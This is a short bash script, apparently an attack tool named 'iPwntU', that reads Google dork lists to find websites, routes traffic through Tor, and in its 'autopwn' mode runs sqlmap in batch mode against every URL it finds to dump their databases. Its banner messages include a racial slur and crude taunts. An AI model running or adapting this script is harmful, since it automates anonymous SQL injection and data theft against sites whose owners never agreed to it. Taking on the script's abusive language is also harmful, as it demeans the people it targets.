#!/bin/bash

##############
# <settings> #
##############


###############
# </settings> #
###############

echo "########################################"
echo "### iPwntU.SQL Dorker & SQL injector ###"
echo "########################################"
echo ""
sleep 1

if [ $# != 4  ]; then
echo " usage: $0 <dorkfile> <injection> <autopwn[on|off]> <providers>"
echo ""
echo "########################################"
echo "###    iPwntU [@] Sigaint [.] org    ###"
echo "########################################"
sleep 1
exit;
fi

if [ `whoami` != 'root' ]; then
echo ""
echo "########################################"
echo "###  Try Gaining r00t First Pussay   ###"
echo "########################################"
exit;

else 
echo ""
echo "########################################"
echo "###    Reloading TOR Proxy Server    ###"
echo "########################################"
/etc/init.d/tor start | awk '{ print $0 }'
sleep 1

echo "########################################"
echo "###   Lets Try And Get Lucky Nigga   ###"
echo "########################################"
sleep 3
if [ "$3" != 'off' ]; then

dorker -q $4 --save-as=`pwd`/logs/scan`date +%Y%m%d%H%M%S`.log --dork-file=`pwd`/dorks/$1 --exploit-get=$2 --command-vul="sqlmap --output-dir=`pwd`/logs/ --random-agent --tor --tor-type=socks5 --tor-port=9050 --check-tor --dump-format=SQLITE --url='_TARGETFULL_' --batch"
else 
dorker -q $4 --save-as=`pwd`/logs/scan`date +%Y%m%d%H%M%S`.log --dork-file=`pwd`/dorks/$1 --exploit-get=$2 --command-vul="echo '_TARGETFULL_' >> `pwd`/logs/logged_only.log"
fi
sleep 1

echo ""
echo "########################################"
echo "###    iPwntU [@] Sigaint [.] org    ###"
echo "########################################"
sleep 1
exit;
fi

